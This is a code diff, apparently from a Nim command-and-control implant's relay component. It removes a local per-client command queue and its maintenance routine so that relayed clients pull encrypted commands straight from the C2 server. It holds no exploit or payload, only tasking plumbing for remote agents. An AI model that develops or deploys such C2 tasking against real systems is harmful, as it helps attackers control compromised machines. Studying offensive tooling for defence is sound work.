@@ -17,7 +17,6 @@ import core/relay/[relay_protocol, relay_comm, relay_config]
 import modules/relay/relay_commands
 # Import the global relay server from relay_commands to avoid conflicts
 from modules/relay/relay_commands import g_relayServer, getConnectionStats, broadcastMessage, sendToClient, getConnectedClients
-from core/relay/relay_comm import hasQueuedCommands, getQueuedCommandsForClient, performQueueMaintenance, queueCommandForClient
 # Removed unused threadpool and locks imports
 
 # Import relay state from relay_commands module - NOW USING SAFE FUNCTIONS
@@ -1048,64 +1047,10 @@ proc httpHandler() {.async.} =
                                     
                                 let checkInStartTime = epochTime()
                                 
-                                # CRITICAL FIX: Check local command queue first before going to C2
-                                var cmdGuid, cmd: string
-                                var args: seq[string]
+                                # CLEAN FIX: Create dedicated relay client listener for getQueuedCommand()
+                                let relayClientListener = createRelayClientListener(listener, msg.fromID, relayClientKey)
                                 
-                                # Check if we have queued commands for this relay client
-                                if hasQueuedCommands(g_relayServer, msg.fromID):
-                                    when defined debug:
-                                        echo "[DEBUG] 💓 HTTP Handler: Found queued commands for relay client: " & msg.fromID
-                                    
-                                    # Get ONE command from local queue (FIFO - first in, first out)
-                                    let queuedCommands = getQueuedCommandsForClient(g_relayServer, msg.fromID)
-                                    if queuedCommands.len > 0:
-                                        # Process first command from queue
-                                        let queuedCmd = queuedCommands[0]
-                                        
-                                        # If there are more commands, put them back in the queue
-                                        if queuedCommands.len > 1:
-                                            when defined debug:
-                                                echo "[DEBUG] 💓 HTTP Handler: " & $(queuedCommands.len - 1) & " commands remaining, re-queueing them"
-                                            for i in 1..<queuedCommands.len:
-                                                queueCommandForClient(g_relayServer, msg.fromID, queuedCommands[i])
-                                        
-                                        # Parse command from queued message
-                                        try:
-                                            let cmdData = parseJson(queuedCmd.payload)
-                                            cmdGuid = cmdData["cmdGuid"].getStr()
-                                            cmd = cmdData["encrypted_command"].getStr()
-                                            args = @[]
-                                            if cmdData.hasKey("args"):
-                                                for arg in cmdData["args"].getElems():
-                                                    args.add(arg.getStr())
-                                            
-                                            when defined debug:
-                                                echo "[DEBUG] 💓 HTTP Handler: Parsed queued command: " & cmd
-                                                echo "[DEBUG] 💓 HTTP Handler: Command GUID: " & cmdGuid
-                                        except:
-                                            when defined debug:
-                                                echo "[DEBUG] 💓 HTTP Handler: Failed to parse queued command"
-                                            cmd = ""
-                                            cmdGuid = ""
-                                            args = @[]
-                                    else:
-                                        cmd = ""
-                                        cmdGuid = ""
-                                        args = @[]
-                                else:
-                                    # No local commands, check C2 as fallback
-                                    when defined debug:
-                                        echo "[DEBUG] 💓 HTTP Handler: No local commands, checking C2 for relay client: " & msg.fromID
-                                    
-                                    # CLEAN FIX: Create dedicated relay client listener for getQueuedCommand()
-                                    let relayClientListener = createRelayClientListener(listener, msg.fromID, relayClientKey)
-                                    
-                                    let (c2CmdGuid, c2Cmd, c2Args) = webClientListener.getQueuedCommand(relayClientListener)
-                                    cmdGuid = c2CmdGuid
-                                    cmd = c2Cmd
-                                    args = c2Args
-                                
+                                let (cmdGuid, cmd, args) = webClientListener.getQueuedCommand(relayClientListener)
                                 let checkInDuration = (epochTime() - checkInStartTime) * 1000.0  # Convert to ms
                                 
                                 when defined debug:
@@ -1711,18 +1656,6 @@ proc httpHandler() {.async.} =
             except Exception as chainError:
                 when defined debug:
                     echo "[DEBUG] 🔗 Chain Info: Error: " & chainError.msg
-            
-            # HYBRID QUEUE MAINTENANCE: Perform periodic cleanup (every 60 cycles ≈ 5 minutes)
-            if g_relayServer.isListening and (httpCycleCount mod 60 == 0):
-                when defined debug:
-                    echo "[DEBUG] 🔧 Performing periodic queue maintenance (cycle " & $httpCycleCount & ")"
-                try:
-                    performQueueMaintenance(g_relayServer)
-                    when defined debug:
-                        echo "[DEBUG] 🔧 Queue maintenance completed successfully"
-                except Exception as queueError:
-                    when defined debug:
-                        echo "[DEBUG] 🔧 Queue maintenance error: " & queueError.msg
             
             await sleepAsync(totalSleepMs)
             
